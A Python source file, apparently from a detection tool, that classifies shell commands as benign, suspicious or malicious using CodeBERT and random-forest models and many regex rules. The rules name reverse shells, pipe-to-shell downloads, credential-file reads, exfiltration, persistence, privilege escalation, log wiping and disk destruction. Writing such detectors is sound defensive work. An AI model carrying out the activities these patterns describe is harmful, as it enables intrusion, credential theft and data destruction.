import base64
import csv
import json
import math
import os
import re

import joblib
import torch
import torch.nn as nn
import torch.nn.functional as F
from torch.amp import autocast
from transformers import RobertaModel, RobertaTokenizer

try:
    import pyminusone
except ImportError:
    pyminusone = None


def _env_flag(name: str, default: bool) -> bool:
    return os.getenv(name, "1" if default else "0").strip().lower() in {"1", "true", "yes", "on"}


benign_conf_threshold = float(os.getenv("GENOS_BENIGN_CONF_THRESHOLD", "0.52"))
suspicious_conf_threshold = float(os.getenv("GENOS_SUSPICIOUS_CONF_THRESHOLD", "0.55"))
malicious_conf_threshold = float(os.getenv("GENOS_MALICIOUS_CONF_THRESHOLD", "0.78"))
low_margin_threshold = float(os.getenv("GENOS_LOW_MARGIN_THRESHOLD", "0.12"))
specialist_suspicious_conf_threshold = float(os.getenv("GENOS_SPECIALIST_SUSPICIOUS_CONF_THRESHOLD", "0.63"))
high_risk_override_enabled = _env_flag("GENOS_HIGH_RISK_OVERRIDE_ENABLED", True)
suspicious_fallback_enabled = _env_flag("GENOS_SUSPICIOUS_FALLBACK_ENABLED", True)


BASE_DIR = os.path.dirname(os.path.abspath(__file__))

import sys as _sys
_PARSER_DIR = os.path.join(BASE_DIR, "parser")
if _PARSER_DIR not in _sys.path:
    _sys.path.insert(0, _PARSER_DIR)

try:
    from parser import parse_command as _parse_command
    from semantic_features import build_semantic_features as _build_semantic_features
    from rule_engine import build_rule_result as _build_rule_result
    from candidate_mask import build_prior_vector as _build_prior_vector
    from build_residual_dataset import build_residual as _build_residual, build_feature_tags as _build_feature_tags
    _RESIDUAL_PIPELINE_AVAILABLE = True
except ImportError:
    _RESIDUAL_PIPELINE_AVAILABLE = False


def _resolve_asset_path(path_value: str, fallback_relpaths: list[str] | None = None) -> str:
    """Resolve asset path with support for multiple fallbacks."""
    if os.path.isabs(path_value):
        if os.path.exists(path_value):
            return path_value
    else:
        cwd_candidate = os.path.join(os.getcwd(), path_value)
        if os.path.exists(cwd_candidate):
            return cwd_candidate

        base_candidate = os.path.join(BASE_DIR, path_value)
        if os.path.exists(base_candidate):
            return base_candidate

    if fallback_relpaths:
        for fallback in fallback_relpaths if isinstance(fallback_relpaths, list) else [fallback_relpaths]:
            fallback_candidate = os.path.join(BASE_DIR, fallback)
            if os.path.exists(fallback_candidate):
                return fallback_candidate

    return path_value


class Tier1_Gatekeeper(nn.Module):
    def __init__(self, num_classes=3):
        super().__init__()
        self.encoder = RobertaModel.from_pretrained("microsoft/codebert-base", use_safetensors=True)
        self.classifier = nn.Sequential(
            nn.Dropout(0.2),
            nn.Linear(768, 1024),
            nn.GELU(),
            nn.Dropout(0.2),
            nn.Linear(1024, num_classes),
        )

    def forward(self, input_ids, attention_mask):
        outputs = self.encoder(input_ids=input_ids, attention_mask=attention_mask)
        logits = self.classifier(outputs.last_hidden_state[:, 0, :])
        return logits


class _MeanPool(nn.Module):
    def forward(self, hidden, mask):
        mask = mask.unsqueeze(-1).expand(hidden.size()).float()
        summed = torch.sum(hidden * mask, dim=1)
        counts = torch.clamp(mask.sum(dim=1), min=1e-9)
        return summed / counts


class Tier2_Specialist(nn.Module):
    def __init__(self, num_classes):
        super().__init__()
        self.encoder = RobertaModel.from_pretrained("microsoft/codebert-base", use_safetensors=True)
        self.pool = _MeanPool()
        self.classifier = nn.Sequential(
            nn.Dropout(0.2),
            nn.Linear(768, 768),
            nn.GELU(),
            nn.Dropout(0.2),
            nn.Linear(768, num_classes),
        )

    def forward(self, input_ids, attention_mask):
        outputs = self.encoder(input_ids=input_ids, attention_mask=attention_mask)
        pooled = self.pool(outputs.last_hidden_state, attention_mask)
        logits = self.classifier(pooled)
        return logits


class GenosEngine:
    _TECHNIQUE_REASON_HINTS = {
        "T1490": [
            "Deletes shadow copies or backup artifacts",
            "Targets recovery paths or system restore mechanisms",
        ],
        "T1486": [
            "Shows impact-oriented destructive or recovery-inhibiting behavior",
        ],
        "T1140": [
            "Decodes or unwraps embedded payload content",
        ],
        "T1027": [
            "Uses encoded or obfuscated command content",
        ],
        "T1053": [
            "Creates or updates scheduled task execution",
        ],
        "T1547": [
            "Modifies autorun locations for persistence",
        ],
        "T1083": [
            "Enumerates files or directories on the local system",
        ],
        "T1018": [
            "Performs local network discovery activity",
        ],
        "T1087": [
            "Enumerates local or domain account information",
        ],
    }

    _PUBLIC_LABEL_MAP = {
        "Benign": "Benign",
        "Malicious": "Malicious",
        "Context_Dependent": "Suspicious",
    }
    _INTERNAL_LABEL_MAP = {value: key for key, value in _PUBLIC_LABEL_MAP.items()}

    _DOWNLOAD_RE = re.compile(
        r"\b(?:curl|wget|invoke-webrequest|iwr|bitsadmin|certutil(?:\.exe)?|aria2c|fetch)\b",
        re.I,
    )
    _PIPE_TO_SHELL_RE = re.compile(
        r"(?:curl|wget|invoke-webrequest|iwr|echo|printf).{0,200}\|\s*(?:(?:/bin/)?(?:ba|z)?sh|pwsh?|powershell)\b",
        re.I | re.S,
    )
    _REVERSE_SHELL_RE = re.compile(
        r"(?:/dev/tcp/|\bnc(?:at)?\b.*(?:-e|-c)\s*/bin/(?:ba)?sh\b|mkfifo\b.*\bnc(?:at)?\b|"
        r"socket\.socket\(\).*connect\(|tcpsocket\.open\(|fsockopen\(|s_client\b.*\|\s*/bin/(?:ba)?sh\b)",
        re.I | re.S,
    )
    _BASE64_EXEC_RE = re.compile(
        r"(?:-enc(?:odedcommand)?\s+[A-Za-z0-9+/=]{20,}|frombase64string|base64\s+-d\b|certutil\s+-decode\b)",
        re.I,
    )
    _EVAL_EXEC_RE = re.compile(
        r"\b(?:eval|iex\b|invoke-expression\b|exec\s*\(|python\d?\s+-c\b|perl\s+-e\b|ruby\s+-e\b|php\s+-r\b|node\s+-e\b)",
        re.I,
    )
    _SHELL_SPAWN_RE = re.compile(
        r"(?:/bin/(?:ba)?sh\b|cmd(?:\.exe)?\s+/c\b|powershell(?:\.exe)?\b|pwsh\b)",
        re.I,
    )
    _SENSITIVE_FILE_READ_RE = re.compile(
        r"\b(?:cat|less|more|head|tail|grep|awk|sed|cut|strings|xxd|od|nl|wc|stat|file)\b.*"
        r"(?:/etc/(?:shadow|sudoers)|/root/\.ssh/|authorized_keys|id_rsa|\.kube/config|"
        r"/proc/\d+/environ)",
        re.I,
    )
    _NETWORK_ENUM_RE = re.compile(
        r"^\s*(?:nmap|masscan|zmap|netstat|ss|ifconfig|arp|route|traceroute|tracepath|mtr|dig|nslookup|host)\b"
        r"|^\s*ip\s+(?:addr|route|neigh|link|rule)\b",
        re.I,
    )
    _PROCESS_ENUM_RE = re.compile(
        r"^\s*(?:ps|top|pstree|pgrep|pidof|lsof)\b|^\s*docker\s+(?:ps|top|inspect)\b",
        re.I,
    )
    _TUNNELING_RE = re.compile(
        r"\bssh\b.*\s-[DLR]\s|\bchisel\b|\bsocat\b|\bsshuttle\b|\bfrp[cps]\b|\bnc(?:at)?\b.*\s-l\b",
        re.I,
    )
    _PACKET_CAPTURE_RE = re.compile(r"^\s*(?:tcpdump|tshark|dumpcap|wireshark)\b", re.I)
    _DEBUG_TRACE_RE = re.compile(r"^\s*(?:strace|ltrace|gdb|perf\s+trace)\b", re.I)
    _ENUMERATION_RECON_RE = re.compile(
        r"(?:"
        # Network socket enumeration with all-connections or process-display flags
        r"^\s*(?:ss|netstat)\s+-[a-zA-Z]*(?:a|p)[a-zA-Z]*\b"
        r"|"
        # Login/session enumeration
        r"^\s*(?:last(?:\s+-\d+)?|w|who)\s*$"
        r"|"
        # Cron/scheduled job inspection
        r"^\s*(?:ls|cat|find|stat)\b.*/etc/cron"
        r"|"
        # Process enumeration with wide output
        r"^\s*ps\s+aux(?:ww)?\s*$"
        r"|"
        # Sensitive directory listing (/dev/shm, /root)
        r"^\s*ls\b.*(?:/dev/shm|/root)\b"
        r"|"
        # Secret/token hunting in environment
        r"^\s*env\s*\|\s*grep\s+-i\s*(?:secret|token|key|password|cred)"
        r"|"
        # Firewall / security policy inspection
        r"^\s*(?:iptables\s+-L|aa-status|sestatus|apparmor_status)\b"
        r"|"
        # Privilege check
        r"^\s*sudo\s+-l\b"
        r"|"
        # VM detection / fingerprinting
        r"^\s*(?:systemd-detect-virt|dmidecode)\b"
        r"|"
        r"\bdmesg\b.*\bgrep\b.*\b(?:virtual|vbox|vmware|hyperv|qemu|kvm)\b"
        r"|"
        # Routing table enumeration (ip route without addr/link)
        r"^\s*ip\s+route\s*$"
        r"|"
        # HTTP server (can be used for exfil staging)
        r"^\s*python3?\s+-m\s+http\.server\s+(?!127\.0\.0\.1)\d"
        r"|"
        # /proc/version for kernel fingerprinting
        r"^\s*cat\s+/proc/version\b"
        r"|"
        # getfacl on sensitive files
        r"^\s*getfacl\b.*(?:/etc/shadow|/etc/sudoers)"
        r"|"
        # Kernel module listing for VM detection
        r"^\s*lsmod\b.*\|\s*grep\b.*\b(?:vbox|vmware|hyperv)\b"
        r")",
        re.I | re.M,
    )
    _AGGRESSIVE_NMAP_RE = re.compile(
        r"^\s*nmap\b.*(?:-sS\b|-sV\b.*--script|--script=vuln|-p-\b|-A\b|--script=exploit)",
        re.I,
    )
    _POST_EXPLOIT_RE = re.compile(
        r"(?:"
        # TTY upgrade / pty spawn
        r"\bpty\.spawn\b"
        r"|"
        # Known post-exploitation tools
        r"^\s*(?:\.?/)?(?:linpeas(?:\.sh)?|winpeas|pspy\d*|linenum(?:\.sh)?)\b"
        r"|"
        # LD_PRELOAD library injection
        r"\bLD_PRELOAD=\S+\.so\b"
        r")",
        re.I | re.M,
    )
    _EXFIL_DATA_MOVEMENT_RE = re.compile(
        r"(?:"
        # curl POST with file data to non-standard targets
        r"^\s*curl\b.*(?:-X\s+POST|--request\s+POST)\b.*-d\s+@"
        r"|"
        # tar/archive of sensitive user directories (.ssh, etc)
        r"^\s*tar\b.*(?:/home/[^\s]+/\.ssh|/root/\.ssh|/etc/shadow)"
        r"|"
        # scp/rsync of highly sensitive system files to remote
        r"^\s*(?:scp|rsync)\b.*(?:/etc/passwd|/etc/shadow).*@"
        r"|"
        # Download from internal/private IPs (lateral tool transfer)
        r"^\s*(?:curl|wget)\b.*https?://(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)\S+"
        r")",
        re.I | re.M,
    )
    _OFFENSIVE_TOOLING_RE = re.compile(
        r"^\s*(?:nmap|nikto|hydra|sqlmap|masscan|zmap|enum4linux|crackmapexec|responder|"
        r"impacket-|msfconsole|mimikatz(?:\.exe)?|john\b|hashcat\b|linpeas(?:\.sh)?|pspy\d*|bloodhound-python)\b",
        re.I,
    )
    _PERSISTENCE_RE = re.compile(
        r"(?:crontab\s+-(?!l\b)|echo\s+.*\|\s*crontab\b|schtasks\s+/create\b|currentversion\\run\b|"
        r"authorized_keys\b.*>>|systemctl\s+enable\b|rc\.local|"
        r"(?:cp|mv|install|tee)\b.*\b/etc/cron\.(?:d|daily|hourly|monthly|weekly)\b|"
        r"(?:echo|printf)\b.*>\s*/etc/cron\.(?:d|daily|hourly|monthly|weekly)\b|"
        r"at\s+\d)",
        re.I,
    )
    _PRIVESC_RE = re.compile(
        r"(?:chmod\s+(?:u\+s|4[0-7]{3})\s+/(?:bin|usr/bin|sbin)|/etc/sudoers\b.*>|useradd\s+.*-u\s+0\b|setcap\s+cap_setuid"
        r"|usermod\b.*-aG\s+(?:sudo|wheel|root|admin|docker)\b"
        r"|passwd\s+-d\s+root\b"
        r"|PermitRootLogin\s+yes.*>>\s*/etc/ssh)",
        re.I,
    )
    _DEFENSE_IMPAIR_RE = re.compile(
        r"(?:iptables\s+-F\b|ufw\s+disable\b|setenforce\s+0\b|systemctl\s+(?:stop|disable)\s+"
        r"(?:firewalld|ufw|auditd|sysmon)|auditctl\b.*-e\s+0|sc\s+stop\s+windefend|powershell.*set-mppreference"
        r"|truncate\s+-s\s+0\s+/var/log"
        r"|shred\b.*(?:/var/log|/etc/|auth\.log|syslog|kern\.log))",
        re.I,
    )
    _DESTRUCTIVE_RE = re.compile(
        r"(?:\bdd\b.*(?:if=/dev/(?:zero|urandom)).*(?:of=/dev/(?:sd[a-z]\d*|nvme\d+n\d+(?:p\d+)?|vd[a-z]\d*))"
        r"|\bmkfs(?:\.[a-z0-9_+-]+)?\b\s+/dev/"
        r"|\brm\s+-rf\s+/+(?:\s|$)"
        r"|shred\b.*\s+/dev/"
        r"|\bwipefs\s+-a\b"
        r"|\buserdel\s+-r\b"
        r"|\bpkill\s+-9\s+(?:sshd|init|systemd)\b"
        r"|\bkill\s+-9\s+1\b)",
        re.I,
    )
    _ARCHIVE_BULK_RE = re.compile(
        r"^\s*(?:tar|zip|7z|rar|rsync)\b.*(?:/etc|/var/log|/home|/opt|/srv)"
        r"|^\s*cp\b.*(?:/etc(?:/|\s)|/var/log).*(?:/etc|/var/log|/home|/opt|/srv)"
        r"|^\s*find\b(?!.*-maxdepth\s+[12]\b).*(?:/etc|/var/log|/home).*(?:-name|-type)",
        re.I,
    )
    _REMOTE_TRANSFER_RE = re.compile(
        r"^\s*(?:scp|sftp|ftp|rsync)\b.*[@:][^ ]+|^\s*(?:curl|wget)\b.*(?:--upload-file|-T|--data-binary\s+@|--form\s+@|-d\s+@)",
        re.I,
    )
    _SERVICE_INSPECTION_RE = re.compile(
        r"^\s*(?:systemctl\s+(?:status|list-units|list-unit-files|is-active|is-enabled)|service\s+--status-all|"
        r"journalctl\s+-u|docker\s+(?:ps|info|images)|kubectl\s+(?:get|describe|cluster-info|top)|"
        r"(?:mount|lsblk|blkid|findmnt|df)\b)",
        re.I,
    )
    _LOCAL_ARTIFACT_INSPECTION_RE = re.compile(
        r"^\s*(?:md5sum|sha(?:1|224|256|384|512)?sum|file)\b.*(?:"
        r"/(?:bin|usr/bin|sbin|usr/sbin|usr/local/bin|tmp|var/tmp|var/backups|srv/(?:builds|releases|artifacts|snapshots)|opt/(?:artifacts|builds)|home/[^\s]+/(?:downloads|builds))/|"
        r"\.(?:tar(?:\.gz)?|tgz|zip|deb|rpm|asc|xml|pem|crt|log|txt|csv|bak)\b)",
        re.I,
    )
    _BENIGN_SNAPSHOT_SOURCE_RE = re.compile(
        r"(?:/var/log(?:/[^\s]*)?|/etc/(?:nginx|ssh|ssl/certs|systemd/system)|/srv/(?:app(?:/current|/config)?|releases)|"
        r"/home/[^\s]+/(?:builds|\.config)|/tmp/(?:release|backup|snapshot|artifact)|/opt/(?:artifacts|builds))",
        re.I,
    )
    _BENIGN_ARCHIVE_PATH_RE = re.compile(
        r"^\s*(?:tar\s+(?:tzf|-xzf|czf)\b|zip\b)",
        re.I,
    )
    _CONTROLLED_REMOTE_TARGET_RE = re.compile(
        r"(?:\b(?:backup|audit|auth|ops|deploy|support|infra|dba|dbadmin)@(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.|[a-z0-9.-]*internal\b|[a-z0-9.-]*company\.local\b)|"
        r":/srv/(?:backup|backups|audit|snapshots|incident|review|notes|staging|forensics|cert-audit|k8s-audit|ssh-baselines|rotated-ssh)[/\s])",
        re.I,
    )
    _CONTROLLED_REMOTE_COPY_RE = re.compile(
        r"^\s*(?:scp|rsync)\b",
        re.I,
    )
    _OPENSSL_CLIENT_INSPECTION_RE = re.compile(
        r"^\s*openssl\s+s_client\b(?!.*:(?:4444|5555|9001|1234)\b).*(?:-connect|-starttls|-servername|-showcerts)\b",
        re.I,
    )
    _ROUTINE_SERVICE_LOG_RE = re.compile(
        r"^\s*(?:journalctl\b|systemctl\s+(?:status|cat|reload|restart|daemon-reload)\b|docker\s+(?:logs|inspect|stats)\b|kubectl\s+(?:logs|describe|rollout|top|get\s+events)\b)",
        re.I,
    )
    _CONTAINER_ADMIN_READONLY_RE = re.compile(
        r"^\s*(?:docker\s+exec|kubectl\s+exec|kubectl\s+cp)\b(?!.*/var/run/secrets).*(?:"
        r"\b(?:env|printenv|ls|find|cat)\b|/var/log|/etc/ssl|/app/config|\.log\b)",
        re.I,
    )
    _SENSITIVE_SOURCE_RE = re.compile(
        r"(?:/etc/(?:shadow|sudoers)|/root/\.ssh|authorized_keys\b|id_rsa\b|id_ed25519\b|/etc/kubernetes|/var/lib/kubelet|"
        r"/opt/secrets|/var/lib/postgresql|/app/\.env|serviceaccount/token|/var/run/secrets|/etc/pam\.d)",
        re.I,
    )
    _EXPLOIT_OR_ATTACK_TOOLING_RE = re.compile(
        r"^\s*(?:hydra|sqlmap|nikto|msfconsole|mimikatz(?:\.exe)?|john\b|hashcat\b|responder\b|ettercap\b|arpspoof\b|"
        r"crackmapexec\b|impacket-|metasploit\b|secretsdump\b|mshta\b)",
        re.I,
    )
    _BENIGN_ADMIN_WORKFLOW_RE = re.compile(
        r"^(?:\s*(?:mount\b.*grep|ip\s+(?:addr|route|link|neigh)\b|ss\b|netstat\b|arp\b|route\b|ps\b|top\s+-b|du\b|ls\b|"
        r"find\s+/(?:tmp|var/log|etc|opt|srv|usr/local/bin|home(?:/[^\s]+)?)\b.*(?:-maxdepth|-type|-mtime)|env\s*\|\s*grep\s+path|history\b|"
        r"file\b|stat\b|head\b|wc\b|md5sum\b|sha(?:1|224|256|384|512)?sum\b|journalctl\b|systemctl\s+(?:status|is-active|is-enabled|"
        r"reload|restart|cat|daemon-reload)\b|docker\s+(?:ps|logs|inspect|stats|exec)\b|kubectl\s+(?:get|logs|describe|rollout|cp|top)\b|"
        r"pip\s+list\b|dpkg\s+-l\b|tar\s+(?:tzf|-xzf|czf)\b|zip\b|rsync\b|scp\b|curl\s+-f?s?S?L?\b.*(?:-o|>)|wget\b.*(?:-o|-O)\b|"
        r"openssl\s+(?:x509|rsa|s_client)\b|python3?\s+-m\s+http\.server\b))",
        re.I,
    )
    _CREDENTIAL_DUMP_RE = re.compile(
        r"(?:/etc/shadow\b|mimikatz|sekurlsa|hashdump|lsass|sam hive|unshadow\b|john\b.*rockyou|secretsdump)",
        re.I,
    )
    # Commands that are risky/bad-practice but NOT definitively malicious.
    # If the model says Malicious, cap them at Suspicious instead.
    _MALICIOUS_CAP_TO_SUSPICIOUS_RE = re.compile(
        r"(?:"
        # chmod with broad perms (777, 666, etc.) but NOT SUID/SGID (4xxx, 2xxx, u+s, g+s)
        r"^\s*chmod\s+(?!(?:u\+s|g\+s|[42][0-7]{3})\b)[0-7]{3,4}\s+"
        r"|"
        # crontab -l (listing, not modifying)
        r"^\s*crontab\s+-l\b"
        r"|"
        # ls / cat on cron directories (inspection, not persistence)
        r"^\s*(?:ls|cat|find|stat|file|head|tail|less|more)\b.*\b/etc/cron"
        r"|"
        # Data movement without definitive attack context — scp/rsync of non-shadow files
        r"^\s*(?:scp|rsync)\b.*(?:/etc/passwd|/var/log/).*@"
        r"|"
        # curl POST with file data (exfil-like but context-dependent)
        r"^\s*curl\b.*(?:-X\s+POST|--request\s+POST)\b.*-d\s+@"
        r"|"
        # tar/archive of user SSH dirs (suspicious but not definitively malicious)
        r"^\s*tar\b.*(?:/home/[^\s]+/\.ssh|\.ssh/)"
        r"|"
        # Download from internal IPs (tool transfer, context-dependent)
        r"^\s*(?:curl|wget)\b.*https?://(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)\S+.*(?:-o|-O)\s"
        r"|"
        # getfacl on sensitive files (enumeration, not exploitation)
        r"^\s*getfacl\b"
        r"|"
        # tcpdump writing to file — monitoring, not definitively malicious without exfil
        r"^\s*tcpdump\b.*\s-w\s"
        r"|"
        # Tunneling standalone — suspicious dual-use, not definitively malicious
        r"^\s*chisel\s+client\b"
        r"|"
        r"\bssh\b.*\s-[DLR]\s.*-[fNq]"
        r"|"
        r"\bssh\b.*-[fNq].*\s-[DLR]\s"
        r"|"
        # SUID hunting / sensitive file enumeration — recon, not exploitation
        r"^\s*find\s+/\s+.*-perm\s+[-+]4000"
        r"|"
        r"^\s*find\b.*-name\s+[\"']?(?:id_rsa|id_ed25519|authorized_keys|id_dsa)[\"']?"
        r"|"
        # Reading sudoers config (enumeration, not modification)
        r"^\s*cat\s+/etc/sudoers\b"
        r"|"
        # Local staging of sensitive directories (no pipe to exfil)
        r"^\s*tar\b.*(?:czf|cz)\b.*(?:/etc/kubernetes|/etc/pam\.d|/opt/secrets|/var/lib/kubelet|/var/lib/postgresql)"
        r"|"
        # rsync/scp of sensitive dirs to remote (context-dependent staging)
        r"^\s*(?:scp|rsync)\b.*(?:/etc/kubernetes|/etc/pam\.d|/opt/secrets|/var/lib/kubelet|/var/lib/postgresql|/etc/ssh).*@"
        r"|"
        # Container archive of config dirs (context-dependent)
        r"^\s*(?:docker|kubectl)\s+exec\b.*\btar\b"
        r")",
        re.I,
    )
    _SIMPLE_OPERATIONAL_BENIGN_PATTERNS = (
        re.compile(r"^\s*(?:pwd|date|uptime|whoami|id(?:\s|$)|hostname(?:\s|$)|uname(?:\s|$)|echo\b|printf\b|true\b|false\b|alias\b)", re.I),
        re.compile(r"^\s*(?:df|free|lsblk|blkid|findmnt)\b", re.I),
        re.compile(r"^\s*cat\s+/(?:etc/(?:hostname|os-release|issue(?:\.net)?|debian_version|redhat-release)|proc/(?:version|cpuinfo|meminfo))\b", re.I),
        re.compile(r"^\s*(?:git\s+log\b|docker\s+ps\b|systemctl\s+status\b|journalctl\s+-u\b)", re.I),
        # Common read-only admin commands
        re.compile(r"^\s*ls(?:\s+-[a-zA-Z]+)*\s*(?:/(?:tmp|var|etc|home|opt|srv|usr|proc|sys|mnt|media|boot|run)\b.*)?$", re.I),
        re.compile(r"^\s*(?:ps(?:\s+(?:aux|ef|-ef|-aux))?|pstree|pgrep\b|pidof\b)\s*", re.I),
        re.compile(r"^\s*(?:ip\s+(?:addr|route|link|neigh)\b|ifconfig(?:\s|$)|route(?:\s+-n)?\s*$)", re.I),
        re.compile(r"^\s*(?:dig|nslookup|host)\b", re.I),
        re.compile(r"^\s*(?:history|env|printenv|set|locale|who|w|last|users|groups|timedatectl|hostnamectl|lscpu|lsmem|lspci|lsusb)\b", re.I),
        re.compile(r"^\s*(?:ss|netstat)(?:\s+-[a-zA-Z]+)*\s*$", re.I),
        re.compile(r"^\s*(?:mount(?:\s|$)|lsof(?:\s|$)|vmstat|iostat|sar|dmesg|nproc)\b", re.I),
        re.compile(r"^\s*(?:docker\s+(?:ps|images|info|version|stats)\b|kubectl\s+(?:get|describe|cluster-info|top|version)\b)", re.I),
        re.compile(r"^\s*crontab\s+-l\b", re.I),
        re.compile(r"^\s*(?:pip|pip3)\s+(?:list|show|freeze)\b", re.I),
        re.compile(r"^\s*(?:dpkg\s+-l|rpm\s+-qa|apt\s+list|yum\s+list|brew\s+list)\b", re.I),
        # Log inspection and mundane file operations
        re.compile(r"^\s*(?:grep\b.*(?:/var/log|\.log\b)|tail\b.*(?:/var/log|\.log\b))", re.I),
        re.compile(r"^\s*cp\s+/tmp/\S+\s+/home/", re.I),
    )
    def __init__(
        self,
        t1_path="models/gatekeeper.pt",
        t2_path="models/specialist_residual_a.pt",
        map_path=None,
        raw_mitre_path="data/training/mitre_atlas_raw.csv",
        gatekeeper_meta_path=None,
        use_residual_format=True,
        prior_alphas=None,
    ):
        self.device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
        self.tokenizer = RobertaTokenizer.from_pretrained("microsoft/codebert-base")
        self.max_length = int(os.getenv("GENOS_MAX_TOKENS", "256"))

        t1_path = _resolve_asset_path(t1_path, ["models/gatekeeper.pt"])
        t2_path = _resolve_asset_path(t2_path, ["models/specialist.pt"])

        # Prefer explicit specialist map JSON when provided (backward compatibility).
        map_candidates = ["config/specialist_map.json", "models/specialist_map.json"]
        if map_path:
            map_candidates = [map_path] + map_candidates

        resolved_map_path = None
        for candidate in map_candidates:
            resolved = _resolve_asset_path(candidate)
            if os.path.exists(resolved):
                resolved_map_path = resolved
                break

        if resolved_map_path:
            self.s_map = self._load_map_from_json(resolved_map_path)
        else:
            raw_csv_path = _resolve_asset_path(
                raw_mitre_path,
                [
                    "data/art/mitre_atlas_raw.csv"
                ],
            )
            self.s_map = self._build_map_from_csv(raw_csv_path)

        meta_candidates = ["config/gatekeeper_meta.json"]
        if gatekeeper_meta_path:
            meta_candidates = [gatekeeper_meta_path] + meta_candidates

        self.gatekeeper_threshold = None
        self.gatekeeper_threshold_source = None
        for candidate in meta_candidates:
            resolved = _resolve_asset_path(candidate, ["config/gatekeeper_meta.json"])
            if os.path.exists(resolved):
                threshold = self._load_gatekeeper_threshold(resolved)
                if threshold is not None:
                    self.gatekeeper_threshold = float(threshold)
                    self.gatekeeper_threshold_source = resolved
                    break

        self.t1 = Tier1_Gatekeeper().to(self.device)
        self.t1.load_state_dict(torch.load(t1_path, map_location=self.device, weights_only=True), strict=False)
        self.t1.eval()

        # Tier-2: TF-IDF char n-gram + RF pipeline (replaces CodeBERT specialist)
        tfidf_path = _resolve_asset_path("models/specialist_tfidf_char_rf.pkl")
        self.t2 = joblib.load(tfidf_path)
        # Build idx→label mapping aligned with the sklearn pipeline's class order
        tfidf_classes = self.t2.classes_  # int indices in s_map
        self._tfidf_idx_to_label = {int(c): self.s_map[int(c)] for c in tfidf_classes if int(c) in self.s_map}

        self.max_deobfuscation_layers = 5
        self.use_residual_format = use_residual_format and _RESIDUAL_PIPELINE_AVAILABLE
        self.prior_alphas = prior_alphas or {"strong": 2.0, "weak": 1.5, "none": 0.0}
        # Forward map {mitre_id: int_index} used by build_prior_vector
        self._specialist_map_fwd = {mitre: idx for idx, mitre in self.s_map.items()}

    def _load_map_from_json(self, json_path: str) -> dict:
        """Load specialist label map from JSON file as {int_index: mitre_id}."""
        with open(json_path, "r", encoding="utf-8") as f:
            raw_map = json.load(f)
        return {int(v): k for k, v in raw_map.items()}

    def _load_gatekeeper_threshold(self, json_path: str):
        try:
            with open(json_path, "r", encoding="utf-8") as f:
                meta = json.load(f)
        except Exception:
            return None

        if isinstance(meta, dict):
            if "threshold" in meta:
                return meta["threshold"]
            for key in ("test_metrics", "val_metrics"):
                if isinstance(meta.get(key), dict) and "threshold" in meta[key]:
                    return meta[key]["threshold"]
        return None

    def _build_map_from_csv(self, csv_path: str) -> dict:
        """Reads the raw MITRE CSV, extracts unique IDs, sorts them, and maps them to ints."""
        unique_ids = set()
        if not os.path.exists(csv_path):
            raise FileNotFoundError(f"Cannot build specialist map. Missing: {csv_path}")

        with open(csv_path, "r", encoding="utf-8") as f:
            reader = csv.DictReader(f)
            for row in reader:
                if "mitre_id" in row and row["mitre_id"].strip():
                    unique_ids.add(row["mitre_id"].strip())

        sorted_ids = sorted(list(unique_ids))
        return {i: mitre_id for i, mitre_id in enumerate(sorted_ids)}

    # ── Evidence helpers ──────────────────────────────────────────────────

    # Flags worth surfacing to analysts (ignore single-letter noise unless meaningful)
    _HIGH_SIGNAL_FLAGS = frozenset({
        "-enc", "-encodedcommand", "-e", "-c", "/c", "-nop", "-noni",
        "-noninteractive", "-windowstyle", "-w", "-exec", "-executionpolicy",
        "-ep", "-bypass", "-command", "/create", "/sc", "/tr", "/tn",
        "/f", "/d", "/t", "/v", "/s", "/add", "/delete",
        "-split", "-f", "-o", "--output", "-urlcache",
        "-decode", "-encode", "-decodefile", "-p", "--post-file",
        "-b64", "--allow-overwrite", "--on-download-complete",
        "-perm", "+4000", "+2000", "-rf", "--flush",
        "/set", "/get", "/query", "/export", "/import",
    })

    # Curated semantic feature labels to surface (boolean True ones)
    _SURFACE_SEM_FEATURES = frozenset({
        "downloads_remote_resource",
        "writes_executable_like_file",
        "modifies_registry_autorun",
        "creates_scheduled_task",
        "creates_or_modifies_service",
        "archive_create",
        "archive_extract",
        "deletes_shadow_copies",
        "remote_execution_or_session",
        "transfers_file_to_remote",
        "runs_interpreter",
        "executes_inline_code",
        "enumerates_identity",
        "enumerates_network_config",
        "reads_credential_store",
        "uses_encoded_payload",
        "uses_obfuscation",
        "uses_signed_proxy_binary",
    })

    # Interpreter detection
    _INTERPRETER_NAMES = {
        "bash": "bash", "sh": "sh", "zsh": "zsh", "fish": "fish",
        "python": "python", "python3": "python", "py": "python",
        "perl": "perl", "ruby": "ruby", "php": "php",
        "node": "node", "node.exe": "node",
        "powershell": "powershell", "powershell.exe": "powershell",
        "pwsh": "powershell", "cmd": "cmd", "cmd.exe": "cmd",
        "wscript": "wscript", "cscript": "cscript",
        "mshta": "mshta", "mshta.exe": "mshta",
    }

    def _build_evidence(self, parsed: dict, sem: dict, rule_result: dict,
                        was_obfuscated: bool = False,
                        deobfuscated_cmd: str | None = None) -> dict:
        """Build curated evidence dict from pipeline outputs."""
        exe = (parsed.get("executable") or "").lower()
        flags = parsed.get("flags") or []

        # ── Execution identity ────────────────────────────────────────
        platform = parsed.get("platform") or "unknown"
        interpreter = (
            self._INTERPRETER_NAMES.get(exe)
            or (parsed.get("interpreter_markers") or [None])[0]
            or None
        )

        # ── High-signal flags ─────────────────────────────────────────
        high_signal_flags = sorted({
            f.lower() for f in flags
            if f.lower() in self._HIGH_SIGNAL_FLAGS
        })

        # ── Structural behavior ───────────────────────────────────────
        has_pipe     = bool(parsed.get("has_pipe"))
        has_redirect = bool(parsed.get("has_redirect"))
        has_chain    = bool(parsed.get("has_chain"))
        inline_code  = bool(parsed.get("inline_code")) or bool(sem.get("executes_inline_code"))

        # ── Obfuscation ───────────────────────────────────────────────
        uses_encoded_payload  = bool(sem.get("uses_encoded_payload"))
        uses_obfuscation_flag = bool(sem.get("uses_obfuscation")) or was_obfuscated
        obfuscation_markers   = list(parsed.get("encoded_markers") or []) + list(parsed.get("obfuscation_markers") or [])
        deob_cmd = deobfuscated_cmd or parsed.get("deobfuscated_command") or None

        # ── LOLBin ────────────────────────────────────────────────────
        lolbin_matches = list(parsed.get("lolbin_matches") or [])
        if exe and exe in {
            "certutil", "mshta", "rundll32", "regsvr32", "wmic", "bitsadmin",
